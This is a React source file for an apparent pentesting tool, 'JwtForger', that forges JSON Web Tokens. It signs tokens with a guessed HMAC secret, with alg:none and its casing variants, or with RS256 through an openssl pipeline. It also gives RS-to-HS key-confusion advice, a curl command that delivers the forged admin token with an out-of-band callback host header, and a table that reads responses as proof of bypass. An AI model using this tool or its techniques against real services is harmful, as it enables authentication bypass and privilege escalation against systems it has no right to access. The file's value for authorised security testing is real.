import { useEffect, useMemo, useState } from 'react';
import {
  Callout,
  Card,
  CodeBlock,
  CopyChip,
  KVTable,
  SectionTitle,
  Select,
  TextArea,
  TextInput,
} from '@/components/ui';
import { DEFAULT_OOB_DOMAIN } from '@/tools/registry';

type Alg = 'HS256' | 'HS384' | 'HS512' | 'none' | 'RS256';

const ALGS = [
  { value: 'HS256', label: 'HS256 — HMAC-SHA256' },
  { value: 'HS384', label: 'HS384 — HMAC-SHA384' },
  { value: 'HS512', label: 'HS512 — HMAC-SHA512' },
  { value: 'none', label: 'none — unsigned' },
  { value: 'RS256', label: 'RS256 — asymmetric (openssl pipeline)' },
] as const;

const DEFAULT_HEADER = `{
  "alg": "HS256",
  "typ": "JWT"
}`;

const DEFAULT_PAYLOAD = `{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin",
  "scope": "orders:write",
  "iat": 1700000000,
  "exp": 1731536000,
  "iss": "https://example.com"
}`;

const HMAC_MAP: Record<string, string> = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };

/** HMAC over the signing input, returned as lowercase hex (WebCrypto covers SHA-384/512 too). */
async function hmacDigestHex(alg: Alg, key: string, message: string): Promise<string> {
  const hash = HMAC_MAP[alg] ?? 'SHA-256';
  const cryptoKey = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(key),
    { name: 'HMAC', hash },
    false,
    ['sign'],
  );
  const sig = await crypto.subtle.sign('HMAC', cryptoKey, new TextEncoder().encode(message));
  return Array.from(new Uint8Array(sig))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
}

function bytesToB64url(bytes: Uint8Array): string {
  let bin = '';
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function textToB64url(text: string): string {
  return bytesToB64url(new TextEncoder().encode(text));
}

function hexToBytes(hex: string): Uint8Array {
  const clean = hex.replace(/[^0-9a-f]/gi, '');
  const out = new Uint8Array(Math.floor(clean.length / 2));
  for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.slice(i * 2, i * 2 + 2), 16);
  return out;
}

function compact(json: string): { text: string; error: string | null } {
  try {
    return { text: JSON.stringify(JSON.parse(json)), error: null };
  } catch (e) {
    return { text: '', error: e instanceof Error ? e.message : 'invalid JSON' };
  }
}

export default function JwtForger() {
  const [headerJson, setHeaderJson] = useState(DEFAULT_HEADER);
  const [payloadJson, setPayloadJson] = useState(DEFAULT_PAYLOAD);
  const [alg, setAlg] = useState<Alg>('HS256');
  const [secret, setSecret] = useState('s3cr3t');
  const [oast, setOast] = useState(DEFAULT_OOB_DOMAIN);
  const [signatureHex, setSignatureHex] = useState<string | null>(null);
  const [signError, setSignError] = useState<string | null>(null);

  const header = useMemo(() => compact(headerJson), [headerJson]);
  const payload = useMemo(() => compact(payloadJson), [payloadJson]);

  const signingInput = useMemo(
    () => (header.text && payload.text ? `${textToB64url(header.text)}.${textToB64url(payload.text)}` : ''),
    [header.text, payload.text],
  );

  useEffect(() => {
    let cancelled = false;
    if (!signingInput || alg === 'none' || alg === 'RS256') {
      setSignatureHex(null);
      return () => {
        cancelled = true;
      };
    }
    setSignError(null);
    hmacDigestHex(alg, secret, signingInput)
      .then((hex) => {
        if (!cancelled) setSignatureHex(hex);
      })
      .catch((e: unknown) => {
        if (!cancelled) setSignError(e instanceof Error ? e.message : 'signing failed');
      });
    return () => {
      cancelled = true;
    };
  }, [signingInput, alg, secret]);

  const token = useMemo(() => {
    if (!signingInput) return '';
    if (alg === 'none') return `${signingInput}.`;
    if (alg === 'RS256') return `${signingInput}.[replace-with-openssl-signature]`;
    if (!signatureHex) return '';
    return `${signingInput}.${bytesToB64url(hexToBytes(signatureHex))}`;
  }, [signingInput, alg, signatureHex]);

  const pyjwt = useMemo(
    () =>
      alg === 'none'
        ? `import jwt\n\n# PyJWT refuses alg=none unless explicitly allowed\nclaims = ${payload.text || '{}'}\ntoken = jwt.encode(claims, key=None, algorithm="none")\nprint(token)`
        : alg === 'RS256'
          ? `import jwt\n\nwith open("private.pem", "rb") as f:\n    key = f.read()\n\nclaims = ${payload.text || '{}'}\nprint(jwt.encode(claims, key, algorithm="RS256"))`
          : `import jwt\n\nclaims = ${payload.text || '{}'}\ntoken = jwt.encode(claims, "${secret.replace(/"/g, '\\"')}", algorithm="${alg}")\nprint(token)`,
    [alg, payload.text, secret],
  );

  const openssl = useMemo(
    () =>
      [
        '# 1. save the signing input (header.payload) exactly as produced above',
        `printf '%s' '${signingInput}' > signing-input.txt`,
        '',
        '# 2. sign with the matching private key',
        'openssl dgst -sha256 -sign private.pem -out sig.bin signing-input.txt',
        '',
        '# 3. base64url the raw signature (no padding) and append',
        `SIG=$(openssl base64 -A -in sig.bin | tr '+/' '-_' | tr -d '=')`,
        `printf '%s.%s\\n' '${signingInput}' "$SIG" > forged.jwt`,
        '',
        '# 4. verify locally before delivery',
        'openssl dgst -sha256 -verify public.pem -signature sig.bin signing-input.txt',
      ].join('\n'),
    [signingInput],
  );

  const jwtHeaderLine = useMemo(
    () =>
      `curl -sS -i 'https://example.com/api/v1/me' \\\n  -H 'Authorization: Bearer ${token || '$FORGED'}' \\\n  -H 'X-Forwarded-Host: ${oast}'`,
    [token, oast],
  );

  return (
    <>
      <Card title="Claims">
        <div className="grid gap-4 lg:grid-cols-2">
          <TextArea label="Header JSON" value={headerJson} onChange={setHeaderJson} rows={6} hint={header.error ?? 'alg is overwritten by the algorithm selector'} />
          <TextArea label="Payload JSON" value={payloadJson} onChange={setPayloadJson} rows={10} hint={payload.error ?? 'Edited as compact JSON before base64url encoding'} />
        </div>
      </Card>

      <Card title="Signing">
        <div className="grid gap-4 sm:grid-cols-3">
          <Select label="Algorithm" value={alg} onChange={(v) => setAlg(v as Alg)} options={ALGS.map((a) => ({ value: a.value, label: a.label }))} />
          <TextInput label="HMAC secret" value={secret} onChange={setSecret} mono hint="Recovered or guessed secret; UTF-8 as-is" disabled={alg === 'none' || alg === 'RS256'} />
          <TextInput label="OAST domain" value={oast} onChange={setOast} mono hint="Hosted JWKS / callback host" />
        </div>

        {alg === 'none' && (
          <div className="mt-4">
            <Callout tone="warn" title="alg:none">
              Header must read <span className="rf-mono">{`"alg":"none"`}</span> and the signature segment must be kept but
              empty — the token ends with a trailing dot. Some parsers also accept <span className="rf-mono">None</span>,{' '}
              <span className="rf-mono">NONE</span> or <span className="rf-mono">nOnE</span>; try each in turn.
            </Callout>
          </div>
        )}
        {alg === 'RS256' && (
          <div className="mt-4">
            <Callout tone="info" title="RS256 requires the private key">
              Paste nothing here — the header and payload are already encoded. Run the openssl pipeline below with the
              recovered or leaked private key, then append the base64url signature. For an RS→HS confusion test, select
              HS256 and use the service public key (PEM, including the header and footer lines) as the secret.
            </Callout>
          </div>
        )}
        {signError && (
          <div className="mt-4">
            <Callout tone="danger" title="Signing failed">{signError}</Callout>
          </div>
        )}

        {alg !== 'RS256' && (
          <div className="mt-4">
            <SectionTitle right={<CopyChip text={token} label="token" />}>Forged token</SectionTitle>
            <CodeBlock code={token || '// waiting for valid JSON in both editors'} maxHeight={180} />
          </div>
        )}
        <div className="mt-4">
          <KVTable
            rows={[
              ['Signing input bytes', String(new TextEncoder().encode(signingInput).length)],
              ['Signature encoding', alg === 'none' ? 'empty segment' : 'base64url of the raw digest (no padding)'],
              ['Header parses', header.error ?? 'yes'],
              ['Payload parses', payload.error ?? 'yes'],
            ]}
          />
        </div>
      </Card>

      <Card title="Equivalent scripts">
        <div className="grid gap-4 lg:grid-cols-2">
          <CodeBlock code={pyjwt} label="python3 + PyJWT" maxHeight={200} />
          <CodeBlock code={openssl} label="openssl dgst -sha256 -sign pipeline" maxHeight={260} />
        </div>
        <div className="mt-4">
          <CodeBlock code={jwtHeaderLine} label="Deliver the token" maxHeight={140} />
        </div>
      </Card>

      <Card title="Reading the response">
        <KVTable
          rows={[
            ['200 with the claim honoured', 'Signature verification is absent or accepts your key — integrity bypass confirmed'],
            ['401 signature invalid', 'Verification is real for this algorithm; pivot to kid/jku injection or key confusion'],
            ['500 / parse error', 'Header shape rejected — try alg casing, padding, or an extra segment'],
            ['403 with role error', 'Signature accepted, authorisation rejected — the token was still trusted'],
          ]}
        />
        <div className="mt-4">
          <Callout tone="warn" title="Two comparisons only">
            Always request the same endpoint with the original token straight after the forged one. A 200 on the forgery
            followed by a 200 on the original proves nothing; a status change between the two is the evidence.
          </Callout>
        </div>
      </Card>
    </>
  );
}
